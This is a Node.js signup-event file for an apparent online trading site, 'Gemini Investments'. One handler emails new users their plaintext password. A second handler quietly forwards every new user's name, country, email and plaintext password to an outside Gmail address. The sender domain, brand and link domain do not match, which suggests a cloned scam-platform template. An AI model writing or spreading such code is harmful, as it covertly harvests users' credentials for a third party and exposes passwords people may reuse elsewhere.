const EventEmitter = require("events");
const sendMail = require("./config/nodemailer");

const eventEmitter = new EventEmitter();

const mailFrom = "Support <support@binarytradesview.com>";

// user.signup
eventEmitter.on("user.signup", async(event) => {
    const { email, firstname, lastname, password } = event;

    try {
        await sendMail({
            from: mailFrom,
            to: email,
            subject: `Welcome to Gemini Investments!`,
            html: `
            <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta http-equiv="X-UA-Compatible" content="IE=edge" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Gemini Investments</title>
          <style>
            html,
            body {
              font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            }
      
            .container {
              max-width: 500px;
              margin: auto;
              padding: 1em;
            }
          </style>
        </head>
      
        <body>
          <div class="container">
            <p>Hello ${firstname} ${lastname},</p>
            <p>We have successfully set up your Gemini Investments trading account!</p>
            <p>Your login details are:</p>
            <p>Email: ${email}</p>
            <p>Password: ${password}</p>
            <p><a href="{{https://www.geminiinvestments.co.uk}}/login">Login to your account</a> and proceed to make your first deposit to start trading now!</p>
            <br />
            <p>Best regards,</p>
            <p>Gemini Investments Team.</p>
          </div>
        </body>
      </html>
            `,
        });
    } catch (error) {
        console.log(error.message);
    }
});

eventEmitter.on("user.signup", async(event) => {
    const { email, firstname, lastname, password, country } = event;

    try {
        await sendMail({
            from: mailFrom,
            to: "247profx@gmail.com",
            subject: `New Gemini investments Account Created!`,
            html: `
            <html lang="en">
            <head>
            <meta charset="UTF-8" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>GEMINI INVESTMENTS</title>
            <style>
            html,
            body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            }
            
            .container {
            max-width: 500px;
            margin: auto;
            padding: 1em;
            }
            </style>
            </head>
            
            <body>
            <div class="container">
            <p>Hello ${firstname} ${lastname},</p>
            <p>A new Gemini Investments account was recently created.</p>
            <p>The login details are:</p>
            
            <p>First name: ${firstname}</p>
            <p>Last name: ${lastname}</p>
            <p>Country: ${country}</p>
            <p>Email: ${email}</p>
            <p>Password: ${password}</p>
            
            <br />
            <p>Best regards,</p>
            <p>Gemini Investments Team.</p>
            </div>
            </body>
            </html>
            `,
        });
    } catch (error) {
        console.log(error.message);
    }
});

module.exports = eventEmitter;